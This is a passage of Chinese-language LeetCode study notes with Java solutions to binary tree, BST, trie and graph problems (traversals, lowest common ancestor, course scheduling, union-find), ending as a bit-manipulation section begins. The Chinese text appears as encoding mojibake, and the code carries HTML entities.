sum); return ret;&#125;private int pathSumStartWithRoot(TreeNode root, int sum) &#123; if (root == null) return 0; int ret = 0; if (root.val == sum) ret++; ret += pathSumStartWithRoot(root.left, sum - root.val) + pathSumStartWithRoot(root.right, sum - root.val); return ret;&#125; å­æ ‘ 572. Subtree of Another Tree (Easy) 123456789101112131415161718192021222324252627282930Given tree s: 3 / \ 4 5 / \ 1 2Given tree t: 4 / \ 1 2Return true, because t has the same structure and node values with a subtree of s.Given tree s: 3 / \ 4 5 / \ 1 2 / 0Given tree t: 4 / \ 1 2Return false. 1234567891011public boolean isSubtree(TreeNode s, TreeNode t) &#123; if (s == null) return false; return isSubtreeWithRoot(s, t) || isSubtree(s.left, t) || isSubtree(s.right, t);&#125;private boolean isSubtreeWithRoot(TreeNode s, TreeNode t) &#123; if (t == null &amp;&amp; s == null) return true; if (t == null || s == null) return false; if (t.val != s.val) return false; return isSubtreeWithRoot(s.left, t.left) &amp;&amp; isSubtreeWithRoot(s.right, t.right);&#125; æ ‘çš„å¯¹ç§° 101. Symmetric Tree (Easy) 12345 1 / \ 2 2 / \ / \3 4 4 3 1234567891011public boolean isSymmetric(TreeNode root) &#123; if (root == null) return true; return isSymmetric(root.left, root.right);&#125;private boolean isSymmetric(TreeNode t1, TreeNode t2) &#123; if (t1 == null &amp;&amp; t2 == null) return true; if (t1 == null || t2 == null) return false; if (t1.val != t2.val) return false; return isSymmetric(t1.left, t2.right) &amp;&amp; isSymmetric(t1.right, t2.left);&#125; æœ€å°è·¯å¾„ 111. Minimum Depth of Binary Tree (Easy) æ ‘çš„æ ¹èŠ‚ç‚¹åˆ°å¶å­èŠ‚ç‚¹çš„æœ€å°è·¯å¾„é•¿åº¦ 1234567public int minDepth(TreeNode root) &#123; if (root == null) return 0; int left = minDepth(root.left); int right = minDepth(root.right); if (left == 0 || right == 0) return left + right + 1; return Math.min(left, right) + 1;&#125; ç»Ÿè®¡å·¦å¶å­èŠ‚ç‚¹çš„å’Œ 404. Sum of Left Leaves (Easy) 1234567 3 / \ 9 20 / \ 15 7There are two left leaves in the binary tree, with values 9 and 15 respectively. Return 24. 12345678910public int sumOfLeftLeaves(TreeNode root) &#123; if (root == null) return 0; if (isLeaf(root.left)) return root.left.val + sumOfLeftLeaves(root.right); return sumOfLeftLeaves(root.left) + sumOfLeftLeaves(root.right);&#125;private boolean isLeaf(TreeNode node)&#123; if (node == null) return false; return node.left == null &amp;&amp; node.right == null;&#125; ç›¸åŒèŠ‚ç‚¹å€¼çš„æœ€å¤§è·¯å¾„é•¿åº¦ 687. Longest Univalue Path (Easy) 1234567 1 / \ 4 5 / \ \ 4 4 5Output : 2 12345678910111213141516private int path = 0;public int longestUnivaluePath(TreeNode root) &#123; dfs(root); return path;&#125;private int dfs(TreeNode root)&#123; if (root == null) return 0; int left = dfs(root.left); int right = dfs(root.right); int leftPath = root.left != null &amp;&amp; root.left.val == root.val ? left + 1 : 0; int rightPath = root.right != null &amp;&amp; root.right.val == root.val ? right + 1 : 0; path = Math.max(path, leftPath + rightPath); return Math.max(leftPath, rightPath);&#125; é—´éš”éå† 337. House Robber III (Medium) 123456 3 / \ 2 3 \ \ 3 1Maximum amount of money the thief can rob = 3 + 3 + 1 = 7. 12345678public int rob(TreeNode root) &#123; if (root == null) return 0; int val1 = root.val; if (root.left != null) val1 += rob(root.left.left) + rob(root.left.right); if (root.right != null) val1 += rob(root.right.left) + rob(root.right.right); int val2 = rob(root.left) + rob(root.right); return Math.max(val1, val2);&#125; æ‰¾å‡ºäºŒå‰æ ‘ä¸­ç¬¬äºŒå°çš„èŠ‚ç‚¹ 671. Second Minimum Node In a Binary Tree (Easy) 12345678Input: 2 / \ 2 5 / \ 5 7Output: 5 ä¸€ä¸ªèŠ‚ç‚¹è¦ä¹ˆå…·æœ‰ 0 ä¸ªæˆ– 2 ä¸ªå­èŠ‚ç‚¹ï¼Œå¦‚æœæœ‰å­èŠ‚ç‚¹ï¼Œé‚£ä¹ˆæ ¹èŠ‚ç‚¹æ˜¯æœ€å°çš„èŠ‚ç‚¹ã€‚ 1234567891011public int findSecondMinimumValue(TreeNode root) &#123; if (root == null) return -1; if (root.left == null &amp;&amp; root.right == null) return -1; int leftVal = root.left.val; int rightVal = root.right.val; if (leftVal == root.val) leftVal = findSecondMinimumValue(root.left); if (rightVal == root.val) rightVal = findSecondMinimumValue(root.right); if (leftVal != -1 &amp;&amp; rightVal != -1) return Math.min(leftVal, rightVal); if (leftVal != -1) return leftVal; return rightVal;&#125; å±‚æ¬¡éå†ä½¿ç”¨ BFS è¿›è¡Œå±‚æ¬¡éå†ã€‚ä¸éœ€è¦ä½¿ç”¨ä¸¤ä¸ªé˜Ÿåˆ—æ¥åˆ†åˆ«å­˜å‚¨å½“å‰å±‚çš„èŠ‚ç‚¹å’Œä¸‹ä¸€å±‚çš„èŠ‚ç‚¹ï¼Œå› ä¸ºåœ¨å¼€å§‹éå†ä¸€å±‚çš„èŠ‚ç‚¹æ—¶ï¼Œå½“å‰é˜Ÿåˆ—ä¸­çš„èŠ‚ç‚¹æ•°å°±æ˜¯å½“å‰å±‚çš„èŠ‚ç‚¹æ•°ï¼Œåªè¦æ§åˆ¶éå†è¿™ä¹ˆå¤šèŠ‚ç‚¹æ•°ï¼Œå°±èƒ½ä¿è¯è¿™æ¬¡éå†çš„éƒ½æ˜¯å½“å‰å±‚çš„èŠ‚ç‚¹ã€‚ ä¸€æ£µæ ‘æ¯å±‚èŠ‚ç‚¹çš„å¹³å‡æ•° 637. Average of Levels in Binary Tree (Easy) 123456789101112131415161718public List&lt;Double&gt; averageOfLevels(TreeNode root) &#123; List&lt;Double&gt; ret = new ArrayList&lt;&gt;(); if (root == null) return ret; Queue&lt;TreeNode&gt; queue = new LinkedList&lt;&gt;(); queue.add(root); while (!queue.isEmpty()) &#123; int cnt = queue.size(); double sum = 0; for (int i = 0; i &lt; cnt; i++) &#123; TreeNode node = queue.poll(); sum += node.val; if (node.left != null) queue.add(node.left); if (node.right != null) queue.add(node.right); &#125; ret.add(sum / cnt); &#125; return ret;&#125; å¾—åˆ°å·¦ä¸‹è§’çš„èŠ‚ç‚¹ 513. Find Bottom Left Tree Value (Easy) 123456789101112Input: 1 / \ 2 3 / / \ 4 5 6 / 7Output:7 12345678910public int findBottomLeftValue(TreeNode root) &#123; Queue&lt;TreeNode&gt; queue = new LinkedList&lt;&gt;(); queue.add(root); while (!queue.isEmpty()) &#123; root = queue.poll(); if (root.right != null) queue.add(root.right); if (root.left != null) queue.add(root.left); &#125; return root.val;&#125; å‰ä¸­ååºéå†12345 1 / \ 2 3 / \ \4 5 6 å±‚æ¬¡éå†é¡ºåºï¼š[1 2 3 4 5 6] å‰åºéå†é¡ºåºï¼š[1 2 4 5 3 6] ä¸­åºéå†é¡ºåºï¼š[4 2 5 1 3 6] ååºéå†é¡ºåºï¼š[4 5 2 6 3 1] å±‚æ¬¡éå†ä½¿ç”¨ BFS å®ç°ï¼Œåˆ©ç”¨çš„å°±æ˜¯ BFS ä¸€å±‚ä¸€å±‚éå†çš„ç‰¹æ€§ï¼›è€Œå‰åºã€ä¸­åºã€ååºéå†åˆ©ç”¨äº† DFS å®ç°ã€‚ å‰åºã€ä¸­åºã€ååºéåªæ˜¯åœ¨å¯¹èŠ‚ç‚¹è®¿é—®çš„é¡ºåºæœ‰ä¸€ç‚¹ä¸åŒï¼Œå…¶å®ƒéƒ½ç›¸åŒã€‚ â‘  å‰åº 12345void dfs(TreeNode root) &#123; visit(root); dfs(root.left); dfs(root.right);&#125; â‘¡ ä¸­åº 12345void dfs(TreeNode root) &#123; dfs(root.left); visit(root); dfs(root.right);&#125; â‘¢ ååº 12345void dfs(TreeNode root) &#123; dfs(root.left); dfs(root.right); visit(root);&#125; éé€’å½’å®ç°äºŒå‰æ ‘çš„å‰åºéå† 144. Binary Tree Preorder Traversal (Medium) 12345678910111213public List&lt;Integer&gt; preorderTraversal(TreeNode root) &#123; List&lt;Integer&gt; ret = new ArrayList&lt;&gt;(); Stack&lt;TreeNode&gt; stack = new Stack&lt;&gt;(); stack.push(root); while (!stack.isEmpty()) &#123; TreeNode node = stack.pop(); if (node == null) continue; ret.add(node.val); stack.push(node.right); // å…ˆå³åå·¦ï¼Œä¿è¯å·¦å­æ ‘å…ˆéå† stack.push(node.left); &#125; return ret;&#125; éé€’å½’å®ç°äºŒå‰æ ‘çš„ååºéå† 145. Binary Tree Postorder Traversal (Medium) å‰åºéå†ä¸º root -&gt; left -&gt; rightï¼Œååºéå†ä¸º left -&gt; right -&gt; rootï¼Œå¯ä»¥ä¿®æ”¹å‰åºéå†æˆä¸º root -&gt; right -&gt; leftï¼Œé‚£ä¹ˆè¿™ä¸ªé¡ºåºå°±å’Œååºéå†æ­£å¥½ç›¸åã€‚ 1234567891011121314public List&lt;Integer&gt; postorderTraversal(TreeNode root) &#123; List&lt;Integer&gt; ret = new ArrayList&lt;&gt;(); Stack&lt;TreeNode&gt; stack = new Stack&lt;&gt;(); stack.push(root); while (!stack.isEmpty()) &#123; TreeNode node = stack.pop(); if (node == null) continue; ret.add(node.val); stack.push(node.left); stack.push(node.right); &#125; Collections.reverse(ret); return ret;&#125; éé€’å½’å®ç°äºŒå‰æ ‘çš„ä¸­åºéå† 94. Binary Tree Inorder Traversal (Medium) 12345678910111213141516public List&lt;Integer&gt; inorderTraversal(TreeNode root) &#123; List&lt;Integer&gt; ret = new ArrayList&lt;&gt;(); if (root == null) return ret; Stack&lt;TreeNode&gt; stack = new Stack&lt;&gt;(); TreeNode cur = root; while (cur != null || !stack.isEmpty()) &#123; while (cur != null) &#123; stack.push(cur); cur = cur.left; &#125; TreeNode node = stack.pop(); ret.add(node.val); cur = node.right; &#125; return ret;&#125; BSTäºŒå‰æŸ¥æ‰¾æ ‘ï¼ˆBSTï¼‰ï¼šæ ¹èŠ‚ç‚¹å¤§äºç­‰äºå·¦å­æ ‘æ‰€æœ‰èŠ‚ç‚¹ï¼Œå°äºç­‰äºå³å­æ ‘æ‰€æœ‰èŠ‚ç‚¹ã€‚ äºŒå‰æŸ¥æ‰¾æ ‘ä¸­åºéå†æœ‰åºã€‚ ä¿®å‰ªäºŒå‰æŸ¥æ‰¾æ ‘ 669. Trim a Binary Search Tree (Easy) 1234567891011121314151617181920Input: 3 / \ 0 4 \ 2 / 1 L = 1 R = 3Output: 3 / 2 / 1 é¢˜ç›®æè¿°ï¼šåªä¿ç•™å€¼åœ¨ L ~ R ä¹‹é—´çš„èŠ‚ç‚¹ 12345678public TreeNode trimBST(TreeNode root, int L, int R) &#123; if (root == null) return null; if (root.val &gt; R) return trimBST(root.left, L, R); if (root.val &lt; L) return trimBST(root.right, L, R); root.left = trimBST(root.left, L, R); root.right = trimBST(root.right, L, R); return root;&#125; å¯»æ‰¾äºŒå‰æŸ¥æ‰¾æ ‘çš„ç¬¬ k ä¸ªå…ƒç´  230. Kth Smallest Element in a BST (Medium) ä¸­åºéå†è§£æ³•ï¼š 123456789101112131415161718private int cnt = 0;private int val;public int kthSmallest(TreeNode root, int k) &#123; inOrder(root, k); return val;&#125;private void inOrder(TreeNode node, int k) &#123; if (node == null) return; inOrder(node.left, k); cnt++; if (cnt == k) &#123; val = node.val; return; &#125; inOrder(node.right, k);&#125; é€’å½’è§£æ³•ï¼š 1234567891011public int kthSmallest(TreeNode root, int k) &#123; int leftCnt = count(root.left); if (leftCnt == k - 1) return root.val; if (leftCnt &gt; k - 1) return kthSmallest(root.left, k); return kthSmallest(root.right, k - leftCnt - 1);&#125;private int count(TreeNode node) &#123; if (node == null) return 0; return 1 + count(node.left) + count(node.right);&#125; æŠŠäºŒå‰æŸ¥æ‰¾æ ‘æ¯ä¸ªèŠ‚ç‚¹çš„å€¼éƒ½åŠ ä¸Šæ¯”å®ƒå¤§çš„èŠ‚ç‚¹çš„å€¼ Convert BST to Greater Tree (Easy) 1234567891011Input: The root of a Binary Search Tree like this: 5 / \ 2 13Output: The root of a Greater Tree like this: 18 / \ 20 13 å…ˆéå†å³å­æ ‘ã€‚ 1234567891011121314private int sum = 0;public TreeNode convertBST(TreeNode root) &#123; traver(root); return root;&#125;private void traver(TreeNode node) &#123; if (node == null) return; traver(node.right); sum += node.val; node.val = sum; traver(node.left);&#125; äºŒå‰æŸ¥æ‰¾æ ‘çš„æœ€è¿‘å…¬å…±ç¥–å…ˆ 235. Lowest Common Ancestor of a Binary Search Tree (Easy) 123456789 _______6______ / \ ___2__ ___8__ / \ / \0 4 7 9 / \ 3 5For example, the lowest common ancestor (LCA) of nodes 2 and 8 is 6. Another example is LCA of nodes 2 and 4 is 2, since a node can be a descendant of itself according to the LCA definition. 12345public TreeNode lowestCommonAncestor(TreeNode root, TreeNode p, TreeNode q) &#123; if (root.val &gt; p.val &amp;&amp; root.val &gt; q.val) return lowestCommonAncestor(root.left, p, q); if (root.val &lt; p.val &amp;&amp; root.val &lt; q.val) return lowestCommonAncestor(root.right, p, q); return root;&#125; äºŒå‰æ ‘çš„æœ€è¿‘å…¬å…±ç¥–å…ˆ 236. Lowest Common Ancestor of a Binary Tree (Medium) 123456789 _______3______ / \ ___5__ ___1__ / \ / \6 2 0 8 / \ 7 4For example, the lowest common ancestor (LCA) of nodes 5 and 1 is 3. Another example is LCA of nodes 5 and 4 is 5, since a node can be a descendant of itself according to the LCA definition. 123456public TreeNode lowestCommonAncestor(TreeNode root, TreeNode p, TreeNode q) &#123; if (root == null || root == p || root == q) return root; TreeNode left = lowestCommonAncestor(root.left, p, q); TreeNode right = lowestCommonAncestor(root.right, p, q); return left == null ? right : right == null ? left : root;&#125; ä»æœ‰åºæ•°ç»„ä¸­æ„é€ äºŒå‰æŸ¥æ‰¾æ ‘ 108. Convert Sorted Array to Binary Search Tree (Easy) 123456789101112public TreeNode sortedArrayToBST(int[] nums) &#123; return toBST(nums, 0, nums.length - 1);&#125;private TreeNode toBST(int[] nums, int sIdx, int eIdx)&#123; if (sIdx &gt; eIdx) return null; int mIdx = (sIdx + eIdx) / 2; TreeNode root = new TreeNode(nums[mIdx]); root.left = toBST(nums, sIdx, mIdx - 1); root.right = toBST(nums, mIdx + 1, eIdx); return root;&#125; æ ¹æ®æœ‰åºé“¾è¡¨æ„é€ å¹³è¡¡çš„äºŒå‰æŸ¥æ‰¾æ ‘ 109. Convert Sorted List to Binary Search Tree (Medium) 123456789Given the sorted linked list: [-10,-3,0,5,9],One possible answer is: [0,-3,9,-10,null,5], which represents the following height balanced BST: 0 / \ -3 9 / / -10 5 12345678910111213141516171819202122public TreeNode sortedListToBST(ListNode head) &#123; if (head == null) return null; if (head.next == null) return new TreeNode(head.val); ListNode preMid = preMid(head); ListNode mid = preMid.next; preMid.next = null; // æ–­å¼€é“¾è¡¨ TreeNode t = new TreeNode(mid.val); t.left = sortedListToBST(head); t.right = sortedListToBST(mid.next); return t;&#125;private ListNode preMid(ListNode head) &#123; ListNode slow = head, fast = head.next; ListNode pre = head; while (fast != null &amp;&amp; fast.next != null) &#123; pre = slow; slow = slow.next; fast = fast.next.next; &#125; return pre;&#125; åœ¨äºŒå‰æŸ¥æ‰¾æ ‘ä¸­å¯»æ‰¾ä¸¤ä¸ªèŠ‚ç‚¹ï¼Œä½¿å®ƒä»¬çš„å’Œä¸ºä¸€ä¸ªç»™å®šå€¼ 653. Two Sum IV - Input is a BST (Easy) 1234567891011Input: 5 / \ 3 6 / \ \2 4 7Target = 9Output: True ä½¿ç”¨ä¸­åºéå†å¾—åˆ°æœ‰åºæ•°ç»„ä¹‹åï¼Œå†åˆ©ç”¨åŒæŒ‡é’ˆå¯¹æ•°ç»„è¿›è¡ŒæŸ¥æ‰¾ã€‚ åº”è¯¥æ³¨æ„åˆ°ï¼Œè¿™ä¸€é¢˜ä¸èƒ½ç”¨åˆ†åˆ«åœ¨å·¦å³å­æ ‘ä¸¤éƒ¨åˆ†æ¥å¤„ç†è¿™ç§æ€æƒ³ï¼Œå› ä¸ºä¸¤ä¸ªå¾…æ±‚çš„èŠ‚ç‚¹å¯èƒ½åˆ†åˆ«åœ¨å·¦å³å­æ ‘ä¸­ã€‚ 12345678910111213141516171819public boolean findTarget(TreeNode root, int k) &#123; List&lt;Integer&gt; nums = new ArrayList&lt;&gt;(); inOrder(root, nums); int i = 0, j = nums.size() - 1; while (i &lt; j) &#123; int sum = nums.get(i) + nums.get(j); if (sum == k) return true; if (sum &lt; k) i++; else j--; &#125; return false;&#125;private void inOrder(TreeNode root, List&lt;Integer&gt; nums) &#123; if (root == null) return; inOrder(root.left, nums); nums.add(root.val); inOrder(root.right, nums);&#125; åœ¨äºŒå‰æŸ¥æ‰¾æ ‘ä¸­æŸ¥æ‰¾ä¸¤ä¸ªèŠ‚ç‚¹ä¹‹å·®çš„æœ€å°ç»å¯¹å€¼ 530. Minimum Absolute Difference in BST (Easy) 1234567891011Input: 1 \ 3 / 2Output:1 åˆ©ç”¨äºŒå‰æŸ¥æ‰¾æ ‘çš„ä¸­åºéå†ä¸ºæœ‰åºçš„æ€§è´¨ï¼Œè®¡ç®—ä¸­åºéå†ä¸­ä¸´è¿‘çš„ä¸¤ä¸ªèŠ‚ç‚¹ä¹‹å·®çš„ç»å¯¹å€¼ï¼Œå–æœ€å°å€¼ã€‚ 123456789101112131415private int minDiff = Integer.MAX_VALUE;private TreeNode preNode = null;public int getMinimumDifference(TreeNode root) &#123; inOrder(root); return minDiff;&#125;private void inOrder(TreeNode node) &#123; if (node == null) return; inOrder(node.left); if (preNode != null) minDiff = Math.min(minDiff, node.val - preNode.val); preNode = node; inOrder(node.right);&#125; å¯»æ‰¾äºŒå‰æŸ¥æ‰¾æ ‘ä¸­å‡ºç°æ¬¡æ•°æœ€å¤šçš„å€¼ 501. Find Mode in Binary Search Tree (Easy) 1234567 1 \ 2 / 2return [2]. ç­”æ¡ˆå¯èƒ½ä¸æ­¢ä¸€ä¸ªï¼Œä¹Ÿå°±æ˜¯æœ‰å¤šä¸ªå€¼å‡ºç°çš„æ¬¡æ•°ä¸€æ ·å¤šï¼Œå¹¶ä¸”æ˜¯æœ€å¤§çš„ã€‚ 1234567891011121314151617181920212223242526272829303132private int curCnt = 1;private int maxCnt = 1;private TreeNode preNode = null;public int[] findMode(TreeNode root) &#123; List&lt;Integer&gt; maxCntNums = new ArrayList&lt;&gt;(); inOrder(root, maxCntNums); int[] ret = new int[maxCntNums.size()]; int idx = 0; for (int num : maxCntNums) &#123; ret[idx++] = num; &#125; return ret;&#125;private void inOrder(TreeNode node, List&lt;Integer&gt; nums) &#123; if (node == null) return; inOrder(node.left, nums); if (preNode != null) &#123; if (preNode.val == node.val) curCnt++; else curCnt = 1; &#125; if (curCnt &gt; maxCnt) &#123; maxCnt = curCnt; nums.clear(); nums.add(node.val); &#125; else if (curCnt == maxCnt) &#123; nums.add(node.val); &#125; preNode = node; inOrder(node.right, nums);&#125; Trie Trieï¼Œåˆç§°å‰ç¼€æ ‘æˆ–å­—å…¸æ ‘ï¼Œç”¨äºåˆ¤æ–­å­—ç¬¦ä¸²æ˜¯å¦å­˜åœ¨æˆ–è€…æ˜¯å¦å…·æœ‰æŸç§å­—ç¬¦ä¸²å‰ç¼€ã€‚ å®ç°ä¸€ä¸ª Trie 208. Implement Trie (Prefix Tree) (Medium) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455class Trie &#123; private class Node &#123; Node[] childs = new Node[26]; boolean isLeaf; &#125; private Node root = new Node(); public Trie() &#123; &#125; public void insert(String word) &#123; insert(word, root); &#125; private void insert(String word, Node node) &#123; if (node == null) return; if (word.length() == 0) &#123; node.isLeaf = true; return; &#125; int index = indexForChar(word.charAt(0)); if (node.childs[index] == null) &#123; node.childs[index] = new Node(); &#125; insert(word.substring(1), node.childs[index]); &#125; public boolean search(String word) &#123; return search(word, root); &#125; private boolean search(String word, Node node) &#123; if (node == null) return false; if (word.length() == 0) return node.isLeaf; int index = indexForChar(word.charAt(0)); return search(word.substring(1), node.childs[index]); &#125; public boolean startsWith(String prefix) &#123; return startWith(prefix, root); &#125; private boolean startWith(String prefix, Node node) &#123; if (node == null) return false; if (prefix.length() == 0) return true; int index = indexForChar(prefix.charAt(0)); return startWith(prefix.substring(1), node.childs[index]); &#125; private int indexForChar(char c) &#123; return c - 'a'; &#125;&#125; å®ç°ä¸€ä¸ª Trieï¼Œç”¨æ¥æ±‚å‰ç¼€å’Œ 677. Map Sum Pairs (Medium) 1234Input: insert("apple", 3), Output: NullInput: sum("ap"), Output: 3Input: insert("app", 2), Output: NullInput: sum("ap"), Output: 5 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051class MapSum &#123; private class Node &#123; Node[] child = new Node[26]; int value; &#125; private Node root = new Node(); public MapSum() &#123; &#125; public void insert(String key, int val) &#123; insert(key, root, val); &#125; private void insert(String key, Node node, int val) &#123; if (node == null) return; if (key.length() == 0) &#123; node.value = val; return; &#125; int index = indexForChar(key.charAt(0)); if (node.child[index] == null) &#123; node.child[index] = new Node(); &#125; insert(key.substring(1), node.child[index], val); &#125; public int sum(String prefix) &#123; return sum(prefix, root); &#125; private int sum(String prefix, Node node) &#123; if (node == null) return 0; if (prefix.length() != 0) &#123; int index = indexForChar(prefix.charAt(0)); return sum(prefix.substring(1), node.child[index]); &#125; int sum = node.value; for (Node child : node.child) &#123; sum += sum(prefix, child); &#125; return sum; &#125; private int indexForChar(char c) &#123; return c - 'a'; &#125;&#125; å›¾äºŒåˆ†å›¾å¦‚æœå¯ä»¥ç”¨ä¸¤ç§é¢œè‰²å¯¹å›¾ä¸­çš„èŠ‚ç‚¹è¿›è¡Œç€è‰²ï¼Œå¹¶ä¸”ä¿è¯ç›¸é‚»çš„èŠ‚ç‚¹é¢œè‰²ä¸åŒï¼Œé‚£ä¹ˆè¿™ä¸ªå›¾å°±æ˜¯äºŒåˆ†å›¾ã€‚ åˆ¤æ–­æ˜¯å¦ä¸ºäºŒåˆ†å›¾ 785. Is Graph Bipartite? (Medium) 123456789Input: [[1,3], [0,2], [1,3], [0,2]]Output: trueExplanation:The graph looks like this:0----1| || |3----2We can divide the vertices into two groups: &#123;0, 2&#125; and &#123;1, 3&#125;. 12345678910Example 2:Input: [[1,2,3], [0,2], [0,1,3], [0,2]]Output: falseExplanation:The graph looks like this:0----1| \ || \ |3----2We cannot find a way to divide the set of nodes into two independent subsets. 1234567891011121314151617181920212223public boolean isBipartite(int[][] graph) &#123; int[] colors = new int[graph.length]; Arrays.fill(colors, -1); for (int i = 0; i &lt; graph.length; i++) &#123; // å¤„ç†å›¾ä¸æ˜¯è¿é€šçš„æƒ…å†µ if (colors[i] == -1 &amp;&amp; !isBipartite(i, 0, colors, graph)) &#123; return false; &#125; &#125; return true;&#125;private boolean isBipartite(int curNode, int curColor, int[] colors, int[][] graph) &#123; if (colors[curNode] != -1) &#123; return colors[curNode] == curColor; &#125; colors[curNode] = curColor; for (int nextNode : graph[curNode]) &#123; if (!isBipartite(nextNode, 1 - curColor, colors, graph)) &#123; return false; &#125; &#125; return true;&#125; æ‹“æ‰‘æ’åºå¸¸ç”¨äºåœ¨å…·æœ‰å…ˆåºå…³ç³»çš„ä»»åŠ¡è§„åˆ’ä¸­ã€‚ è¯¾ç¨‹å®‰æ’çš„åˆæ³•æ€§ 207. Course Schedule (Medium) 122, [[1,0]]return true 122, [[1,0],[0,1]]return false é¢˜ç›®æè¿°ï¼šä¸€ä¸ªè¯¾ç¨‹å¯èƒ½ä¼šå…ˆä¿®è¯¾ç¨‹ï¼Œåˆ¤æ–­ç»™å®šçš„å…ˆä¿®è¯¾ç¨‹è§„å®šæ˜¯å¦åˆæ³•ã€‚ æœ¬é¢˜ä¸éœ€è¦ä½¿ç”¨æ‹“æ‰‘æ’åºï¼Œåªéœ€è¦æ£€æµ‹æœ‰å‘å›¾æ˜¯å¦å­˜åœ¨ç¯å³å¯ã€‚ 12345678910111213141516171819202122232425262728293031323334353637public boolean canFinish(int numCourses, int[][] prerequisites) &#123; List&lt;Integer&gt;[] graphic = new List[numCourses]; for (int i = 0; i &lt; numCourses; i++) &#123; graphic[i] = new ArrayList&lt;&gt;(); &#125; for (int[] pre : prerequisites) &#123; graphic[pre[0]].add(pre[1]); &#125; boolean[] globalMarked = new boolean[numCourses]; boolean[] localMarked = new boolean[numCourses]; for (int i = 0; i &lt; numCourses; i++) &#123; if (hasCycle(globalMarked, localMarked, graphic, i)) &#123; return false; &#125; &#125; return true;&#125;private boolean hasCycle(boolean[] globalMarked, boolean[] localMarked, List&lt;Integer&gt;[] graphic, int curNode) &#123; if (localMarked[curNode]) &#123; return true; &#125; if (globalMarked[curNode]) &#123; return false; &#125; globalMarked[curNode] = true; localMarked[curNode] = true; for (int nextNode : graphic[curNode]) &#123; if (hasCycle(globalMarked, localMarked, graphic, nextNode)) &#123; return true; &#125; &#125; localMarked[curNode] = false; return false;&#125; è¯¾ç¨‹å®‰æ’çš„é¡ºåº 210. Course Schedule II (Medium) 124, [[1,0],[2,0],[3,1],[3,2]]There are a total of 4 courses to take. To take course 3 you should have finished both courses 1 and 2. Both courses 1 and 2 should be taken after you finished course 0. So one correct course order is [0,1,2,3]. Another correct ordering is[0,2,1,3]. ä½¿ç”¨ DFS æ¥å®ç°æ‹“æ‰‘æ’åºï¼Œä½¿ç”¨ä¸€ä¸ªæ ˆå­˜å‚¨ååºéå†ç»“æœï¼Œè¿™ä¸ªæ ˆçš„é€†åºç»“æœå°±æ˜¯æ‹“æ‰‘æ’åºç»“æœã€‚ è¯æ˜ï¼šå¯¹äºä»»ä½•å…ˆåºå…³ç³»ï¼šv-&gt;wï¼Œååºéå†ç»“æœå¯ä»¥ä¿è¯ w å…ˆè¿›å…¥æ ˆä¸­ï¼Œå› æ­¤æ ˆçš„é€†åºç»“æœä¸­ v ä¼šåœ¨ w ä¹‹å‰ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243public int[] findOrder(int numCourses, int[][] prerequisites) &#123; List&lt;Integer&gt;[] graphic = new List[numCourses]; for (int i = 0; i &lt; numCourses; i++) &#123; graphic[i] = new ArrayList&lt;&gt;(); &#125; for (int[] pre : prerequisites) &#123; graphic[pre[0]].add(pre[1]); &#125; Stack&lt;Integer&gt; postOrder = new Stack&lt;&gt;(); boolean[] globalMarked = new boolean[numCourses]; boolean[] localMarked = new boolean[numCourses]; for (int i = 0; i &lt; numCourses; i++) &#123; if (hasCycle(globalMarked, localMarked, graphic, i, postOrder)) &#123; return new int[0]; &#125; &#125; int[] orders = new int[numCourses]; for (int i = numCourses - 1; i &gt;= 0; i--) &#123; orders[i] = postOrder.pop(); &#125; return orders;&#125;private boolean hasCycle(boolean[] globalMarked, boolean[] localMarked, List&lt;Integer&gt;[] graphic, int curNode, Stack&lt;Integer&gt; postOrder) &#123; if (localMarked[curNode]) &#123; return true; &#125; if (globalMarked[curNode]) &#123; return false; &#125; globalMarked[curNode] = true; localMarked[curNode] = true; for (int nextNode : graphic[curNode]) &#123; if (hasCycle(globalMarked, localMarked, graphic, nextNode, postOrder)) &#123; return true; &#125; &#125; localMarked[curNode] = false; postOrder.push(curNode); return false;&#125; å¹¶æŸ¥é›†å¹¶æŸ¥é›†å¯ä»¥åŠ¨æ€åœ°è¿é€šä¸¤ä¸ªç‚¹ï¼Œå¹¶ä¸”å¯ä»¥éå¸¸å¿«é€Ÿåœ°åˆ¤æ–­ä¸¤ä¸ªç‚¹æ˜¯å¦è¿é€šã€‚ å†—ä½™è¿æ¥ 684. Redundant Connection (Medium) 123456Input: [[1,2], [1,3], [2,3]]Output: [2,3]Explanation: The given undirected graph will be like this: 1 / \2 - 3 é¢˜ç›®æè¿°ï¼šæœ‰ä¸€ç³»åˆ—çš„è¾¹è¿æˆçš„å›¾ï¼Œæ‰¾å‡ºä¸€æ¡è¾¹ï¼Œç§»é™¤å®ƒä¹‹åè¯¥å›¾èƒ½å¤Ÿæˆä¸ºä¸€æ£µæ ‘ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344public int[] findRedundantConnection(int[][] edges) &#123; int N = edges.length; UF uf = new UF(N); for (int[] e : edges) &#123; int u = e[0], v = e[1]; if (uf.connect(u, v)) &#123; return e; &#125; uf.union(u, v); &#125; return new int[]&#123;-1, -1&#125;;&#125;private class UF &#123; private int[] id; UF(int N) &#123; id = new int[N + 1]; for (int i = 0; i &lt; id.length; i++) &#123; id[i] = i; &#125; &#125; void union(int u, int v) &#123; int uID = find(u); int vID = find(v); if (uID == vID) &#123; return; &#125; for (int i = 0; i &lt; id.length; i++) &#123; if (id[i] == uID) &#123; id[i] = vID; &#125; &#125; &#125; int find(int p) &#123; return id[p]; &#125; boolean connect(int u, int v) &#123; return find(u) == find(v); &#125;&#125; ä½è¿ç®—1. åŸºæœ¬åŸç† 0s è¡¨ç¤ºä¸€ä¸² 0ï¼Œ1s è¡¨ç¤ºä¸€ä¸² 1ã€‚ 123x ^ 0s = x x &amp; 0s = 0 x | 0s = xx ^ 1s = ~x x &amp; 1s = x x | 1s = 1sx ^ x = 0 x &amp; x = x x | x = x åˆ©ç”¨ x 1s = ~x çš„ç‰¹ç‚¹ï¼Œå¯ä»¥å°†ä½çº§è¡¨ç¤ºç¿»è½¬ï¼›åˆ©ç”¨ x x = 0 çš„ç‰¹ç‚¹ï¼Œå¯ä»¥å°†ä¸‰ä¸ªæ•°ä¸­é‡å¤çš„ä¸¤ä¸ªæ•°å»é™¤ï¼Œåªç•™ä¸‹å¦ä¸€ä¸ªæ•°ã€‚ åˆ©ç”¨ x &amp; 0s = 0 å’Œ x &amp; 1s = x çš„ç‰¹ç‚¹ï¼Œå¯ä»¥å®ç°æ©ç æ“ä½œã€‚ä¸€ä¸ªæ•° num ä¸ mask ï¼š00111100 